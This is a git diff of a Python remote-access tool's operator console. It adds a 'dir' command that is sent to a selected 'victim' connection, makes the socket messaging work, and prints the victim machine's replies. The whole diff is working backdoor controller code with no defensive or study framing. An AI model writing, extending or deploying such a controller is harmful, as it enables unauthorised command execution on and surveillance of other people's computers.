@@ -21,7 +21,7 @@ sessions = {}
 session_ids = []
 
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back"]
+SESSION_COMMANDS = ["help", "back", "dir"]
 
 
 class Commands:
@@ -32,7 +32,7 @@ class Commands:
 				"""
 				help: shows this message
 				back: gets deselects the session and gets you back to them main menu
-				sessions: [-s session id to sellect a session] [-d to dellete a session]
+				sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
 				"""
 			)
 		elif command == "sessions":
@@ -79,35 +79,41 @@ class Commands:
 							confirmation()
 
 					confirmation()
-
 			else:
 				print("you need a  value after your argument!")
 
 	# evaluates the messages send from victims computer
-	def responseEvaluation(self, message):
-		pass
+	def responseEvaluation(self, name, message, conn, addr):
+		print(message)
+		sessionInput(conn, addr, name)
 
 	# for commands if a session is sellected
-	def session(self, conn, addr, message, args=None):
+	def session(self, name, conn, addr, message, args=None):
 		# reveives the messages and passes them to the evaluation
 		def receiveMessage():
-			msg_length = conn.recv(BUFFER).decode(FORMAT)
+			msg_length = int(conn.recv(BUFFER).decode(FORMAT))
 
 			if msg_length:
 				msg = conn.recv(msg_length).decode(FORMAT)
-				self.responseEvaluation(msg)
+				self.responseEvaluation(name, msg, conn, addr)
 
 		# sends the message
-		def sendMessage():
-			message_length = str(len(message)).encode(FORMAT)
+		def sendMessage(msg):
+			# sends the message length
+			message_length = str(len(msg)).encode(FORMAT)
 			message_length += b" " * (BUFFER - len(message_length))
 			conn.send(message_length)
+
 			sleep(0.2)
-			conn.send(message)
+
+			conn.send(msg.encode(FORMAT))
 			receiveMessage()
 
 		if message == "back":
 			mainMenu()
+
+		elif message == "dir":
+			sendMessage(f"c dir")
 
 
 # gets the commands whenn session is sellected
@@ -118,13 +124,16 @@ def sessionInput(conn, addr, name):
 	if commandLst[0] in SESSION_COMMANDS:
 		scom = Commands()
 		if len(commandLst) > 1:
-			scom.session(conn, addr, commandLst[0], commandLst[1:len(commandLst)])
+			scom.session(name, conn, addr, commandLst[0], commandLst[1:len(commandLst)])
 		else:
-			scom.session(conn, addr, commandLst[0])
+			scom.session(name, conn, addr, commandLst[0])
 		sessionInput(conn, addr, name)
 
 	elif commandLst[0] in COMMANDS:
 		print(f"{command} is only availible in the main menu!")
+		sessionInput(conn, addr, name)
+
+	else:
 		sessionInput(conn, addr, name)
 
 
